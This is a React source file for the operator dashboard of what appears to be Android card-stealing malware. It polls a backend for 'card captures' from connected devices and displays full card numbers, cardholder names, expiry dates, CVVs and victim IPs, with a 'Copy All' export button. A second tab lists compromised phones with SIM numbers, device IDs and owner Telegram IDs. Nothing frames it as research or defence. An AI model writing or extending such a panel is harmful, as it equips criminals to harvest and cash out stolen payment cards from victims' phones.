import { useEffect, useMemo, useState } from "react";
import { Layout } from "@/components/layout";
import { getScraped, type ScrapedCard, type ScrapedDevice } from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import {
  CreditCard,
  Smartphone,
  Search,
  Copy,
  ShieldCheck,
  ScanLine,
  Battery,
  Wifi,
  Cpu,
  HardDrive,
  CheckCircle2,
  XCircle,
  Eye,
  EyeOff,
} from "lucide-react";

export function ScrapedData() {
  const [cards, setCards] = useState<ScrapedCard[]>([]);
  const [devices, setDevices] = useState<ScrapedDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState<"cards" | "devices">("cards");
  const [search, setSearch] = useState("");
  const [masked, setMasked] = useState(true);
  const [copied, setCopied] = useState<string | null>(null);

  // Card captures + device info served by the api-server (Bearer auth,
  // owner-filtered), aggregated across all Firebase instances.
  const { data: scrapeData } = usePolling(getScraped, 4000);

  useEffect(() => {
    if (!scrapeData) return;
    setCards(scrapeData.cards || []);
    setDevices(scrapeData.devices || []);
    setLoading(false);
  }, [scrapeData]);

  const mask = (n: string) =>
    masked && n.length > 8 ? "•••• •••• " + n.slice(-4) : n;

  const filteredCards = useMemo(() => {
    if (!search) return cards;
    const q = search.toLowerCase();
    return cards.filter((c) =>
      [
        c.cardNumber,
        c.cardholderName,
        c.deviceModel,
        c.devicePhone,
        c.ownerTelegramId || "",
      ].some((v) => v.toLowerCase().includes(q))
    );
  }, [cards, search]);

  const filteredDevices = useMemo(() => {
    if (!search) return devices;
    const q = search.toLowerCase();
    return devices.filter((d) =>
      [
        d.model,
        d.phone,
        d.deviceId,
        d.sim1,
        d.sim2,
        d.ownerTelegramId || "",
      ].some((v) => v.toLowerCase().includes(q))
    );
  }, [devices, search]);

  const copyText = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  return (
    <Layout>
      <div className="flex flex-col gap-4 mb-5">
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            <p className="page-eyebrow">Auto-Scrape</p>
            <h1 className="page-title flex items-center gap-2">
              <ScanLine className="w-6 h-6 text-primary" />
              Data
            </h1>
            <p className="text-sm text-muted-foreground mt-1">
              Pulled straight from connected devices — {cards.length} card
              captures · {devices.length} devices
            </p>
          </div>
          <div className="flex gap-2">
            <button
              onClick={() => setMasked(!masked)}
              className="flex items-center gap-1.5 px-3.5 h-10 rounded-full border border-input bg-card text-xs font-semibold text-muted-foreground hover:text-foreground hover:border-primary transition-all"
            >
              {masked ? (
                <EyeOff className="w-4 h-4" />
              ) : (
                <Eye className="w-4 h-4" />
              )}
              {masked ? "Show" : "Hide"}
            </button>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex gap-2">
          {(
            [
              {
                id: "cards",
                label: "Card Captures",
                icon: CreditCard,
                count: cards.length,
              },
              {
                id: "devices",
                label: "Device Info",
                icon: Smartphone,
                count: devices.length,
              },
            ] as const
          ).map(({ id, label, icon: Icon, count }) => (
            <button
              key={id}
              onClick={() => setTab(id)}
              className={`flex items-center gap-2 px-4 py-2.5 rounded-full text-xs font-semibold border transition-colors ${
                tab === id
                  ? "bg-primary text-primary-foreground border-primary"
                  : "bg-card border-card-border text-muted-foreground hover:bg-muted"
              }`}
            >
              <Icon className="w-4 h-4" />
              {label}
              <span
                className={`px-1.5 rounded-full text-[10px] ${tab === id ? "bg-primary-foreground/20" : "bg-muted"}`}
              >
                {count}
              </span>
            </button>
          ))}
        </div>

        {/* Search */}
        <div className="relative w-full md:w-80">
          <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
          <input
            type="text"
            placeholder={
              tab === "cards"
                ? "Search card, name, device..."
                : "Search device, phone, ID..."
            }
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-card border border-card-border rounded-xl pl-11 pr-4 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
          />
        </div>
      </div>

      {loading ? (
        <div className="space-y-3">
          {[0, 1].map((i) => (
            <div key={i} className="glass-card h-28 animate-pulse" />
          ))}
        </div>
      ) : tab === "cards" ? (
        filteredCards.length === 0 ? (
          <div className="glass-card p-10 text-center text-muted-foreground">
            <CreditCard className="w-8 h-8 mx-auto mb-2 opacity-40" />
            <p className="font-medium">No card captures yet</p>
            <p className="text-xs mt-1">
              When someone fills in a card on a device, it shows up here
              instantly.
            </p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {filteredCards.map((c) => {
              const key = c.deviceId + c.cardNumber;
              const full = `CARD: ${c.cardNumber}\nNAME: ${c.cardholderName}\nEXP: ${c.expiry}\nCVV: ${c.cvv}\nIP: ${c.ip}`;
              return (
                <div key={key} className="glass-card p-4">
                  <div className="flex items-center justify-between gap-2 mb-2">
                    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-red-500/10 text-red-600 dark:text-red-400 text-[10px] font-bold uppercase tracking-wide">
                      <ShieldCheck className="w-3 h-3" /> Card Captured
                    </span>
                    <span className="text-[10px] font-mono text-muted-foreground">
                      {c.timestamp}
                    </span>
                  </div>

                  <p className="font-mono text-lg font-bold tracking-wider text-foreground mb-1 break-all">
                    {mask(c.cardNumber)}
                  </p>
                  <p className="text-sm font-semibold text-foreground">
                    {c.cardholderName}
                  </p>
                  <p className="text-xs text-muted-foreground mb-3">
                    {c.deviceModel} · {c.devicePhone || c.deviceId}
                    {c.ownerTelegramId &&
                      c.ownerTelegramId !== "null" &&
                      ` · 👤 ${c.ownerTelegramId}`}
                  </p>

                  <div className="flex flex-wrap gap-2 mb-3">
                    <span className="inline-flex items-center px-2 py-1 rounded-lg bg-muted font-mono text-xs">
                      Exp {c.expiry}
                    </span>
                    <span className="inline-flex items-center px-2 py-1 rounded-lg bg-muted font-mono text-xs">
                      CVV {c.cvv}
                    </span>
                    <span className="inline-flex items-center px-2 py-1 rounded-lg bg-muted font-mono text-xs">
                      🌐 {c.ip}
                    </span>
                  </div>

                  <div className="flex gap-2">
                    <button
                      onClick={() => copyText(full, key)}
                      className="flex-1 h-9 rounded-xl bg-primary text-primary-foreground text-xs font-semibold hover:bg-primary/90 transition-all"
                    >
                      {copied === key ? "✓ Copied" : "Copy All"}
                    </button>
                    <button
                      onClick={() => copyText(c.cardNumber, key + "n")}
                      className="px-3 h-9 rounded-xl border border-card-border text-xs font-semibold text-muted-foreground hover:text-foreground hover:border-primary transition-all"
                    >
                      <Copy className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        )
      ) : filteredDevices.length === 0 ? (
        <div className="glass-card p-10 text-center text-muted-foreground">
          <Smartphone className="w-8 h-8 mx-auto mb-2 opacity-40" />
          <p className="font-medium">No device info yet</p>
          <p className="text-xs mt-1">
            Device details stream in here automatically once a device connects.
          </p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-3">
          {filteredDevices.map((d) => (
            <div key={d.deviceId} className="glass-card p-4">
              <div className="flex items-start justify-between gap-2 mb-2">
                <div className="min-w-0">
                  <p className="font-semibold text-sm text-foreground truncate">
                    {d.model}
                  </p>
                  <p className="text-[10px] font-mono text-muted-foreground truncate">
                    {d.deviceId}
                  </p>
                </div>
                <span
                  className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold shrink-0 ${d.status ? "bg-success/10 text-success" : "bg-destructive/10 text-destructive"}`}
                >
                  {d.status ? (
                    <CheckCircle2 className="w-3 h-3" />
                  ) : (
                    <XCircle className="w-3 h-3" />
                  )}
                  {d.status ? "Online" : "Offline"}
                </span>
              </div>

              <div className="grid grid-cols-2 gap-x-3 gap-y-1.5 text-xs mb-3">
                <span className="flex items-center gap-1.5 text-muted-foreground">
                  <Smartphone className="w-3.5 h-3.5 shrink-0" />
                  {d.phone || "—"}
                </span>
                <span className="flex items-center gap-1.5 text-muted-foreground">
                  <Battery className="w-3.5 h-3.5 shrink-0" />
                  {d.battery}
                </span>
                <span className="flex items-center gap-1.5 text-muted-foreground">
                  <Wifi className="w-3.5 h-3.5 shrink-0" />
                  {d.ip}
                </span>
                <span className="flex items-center gap-1.5 text-muted-foreground">
                  <Cpu className="w-3.5 h-3.5 shrink-0" />
                  Android {d.androidV}
                </span>
                <span className="flex items-center gap-1.5 text-muted-foreground">
                  <HardDrive className="w-3.5 h-3.5 shrink-0" />
                  {d.storage}
                </span>
                <span className="flex items-center gap-1.5 text-muted-foreground truncate">
                  📶 {d.sim1 || "—"}
                </span>
                {d.sim2 && (
                  <span className="flex items-center gap-1.5 text-muted-foreground truncate">
                    📶 {d.sim2}
                  </span>
                )}
                <span className="text-muted-foreground truncate">
                  🕐 {d.joined}
                </span>
              </div>

              <button
                onClick={() =>
                  copyText(
                    `MODEL: ${d.model}\nPHONE: ${d.phone}\nID: ${d.deviceId}\nSIM1: ${d.sim1}\nSIM2: ${d.sim2}\nBATTERY: ${d.battery}\nIP: ${d.ip}`,
                    d.deviceId
                  )
                }
                className="w-full h-9 rounded-xl border border-card-border text-xs font-semibold text-muted-foreground hover:text-primary hover:border-primary transition-all flex items-center justify-center gap-1.5"
              >
                <Copy className="w-3.5 h-3.5" /> Copy Info
              </button>
            </div>
          ))}
        </div>
      )}
    </Layout>
  );
}
